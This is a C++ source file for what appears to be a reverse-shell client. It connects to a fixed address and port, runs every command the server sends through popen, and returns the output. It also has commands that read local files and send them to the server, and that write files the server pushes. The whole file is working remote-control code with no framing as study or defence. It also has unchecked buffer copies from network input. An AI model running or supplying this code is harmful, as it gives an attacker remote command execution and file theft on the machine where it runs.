 
#include <iostream>
#include <string>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define HOST "127.0.1.1"
#define PORT 65432        
#define FORMAT "UTF-8"   
using namespace std;


int main() {
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) {
        std::cout << "Socket creation error" << std::endl;
        return 1;
    }
    // Setting up server address
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &server_addr.sin_addr);

    // Connecting to the server
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << "Connection error" << std::endl; // when server is down or don't accept connection
        return 1;
    }

     char buffer[1024] = {0};
     char download[1024] = {0};
       char buffer2[1024]={0};
      char dataread[150];
      string message;
     string message2;
      string outPut;
       memset(buffer,0, strlen(buffer));
    while (true) {
       // Receiving data from the clien
    memset(buffer,0, strlen(buffer));
       recv(client_socket, buffer, 1024, 0);
        if(buffer[0]=='d'&&buffer[1]=='o'&&buffer[2]=='w'&&buffer[3]=='n'){
             char komaki[50] = {0};
             message=buffer;
            int pos;
           pos=message.find(" ");
         string temp=message.substr(pos+1);
         for(int i=0;i<temp.size();i++){
           komaki[i]=temp[i];
         }
         FILE *te;
         te=fopen(komaki,"r");
         if(te==NULL){
             message2="No such file exists";
             send(client_socket, message2.c_str(),message2.size(), 0);
             break;
         }
         while(fgets(dataread,150,te)!=NULL){

            message2+=dataread;
         }
        
         if(message2!=""){
           send(client_socket, message2.c_str(),message2.size(), 0);
         }
           message2="";
           break;
        }
       if(buffer[0]=='u'&&buffer[1]=='p'&&buffer[2]=='l'&&buffer[3]=='o'){
           char komaki[50] = {0};
        komaki[0]='s';komaki[1]='e';komaki[2]='r';komaki[3]='v';komaki[4]='e';
        komaki[5]='r';komaki[6]=' ';
         string temp;
        temp="done right";
        send(client_socket, temp.c_str(),temp.size(), 0);
             message2=buffer;
           int pos=message2.find(" ");
         string temp1=message2.substr(pos+1);
         for(int i=0;i<temp1.size();i++){
           komaki[i+7]=temp1[i];
       }
       for(int i=0;buffer[i]!=0;i++){
        buffer[i]={0};
       }
            recv(client_socket, buffer, 1024, 0);
            string text=buffer;
               printf("%s\n",buffer);
            if(text=="No such file exists"){
              memset(buffer,0, strlen(buffer));
                break;
            }
            else if(buffer!="") {
               FILE *temp;
           temp=fopen(komaki,"w");
            fputs(buffer,temp);
                memset(buffer,0, strlen(buffer));
                   break;
            }
          
        }
        
       FILE *fp;
     fp=popen(buffer,"r");
     while(fgets(buffer2,sizeof(buffer2),fp)!=NULL){
     outPut+=buffer2;
     }
     if(outPut==""){
        string temp;
        temp="done right";
        send(client_socket, temp.c_str(),temp.size(), 0);
     }
     else{
     send(client_socket, outPut.c_str(),outPut.size(), 0);
     }
      memset(buffer,0, strlen(buffer));
    memset(buffer2,0, strlen(buffer2));
     outPut="";
        
    }
    
    // Closing the socket
     memset(download,0,strlen(download));
    memset(buffer,0, strlen(buffer));
    memset(buffer2,0, strlen(buffer2));
    memset(dataread,0, strlen(dataread));
    message2="";
    message="";
    outPut="";
    close(client_socket);
    return 0;
}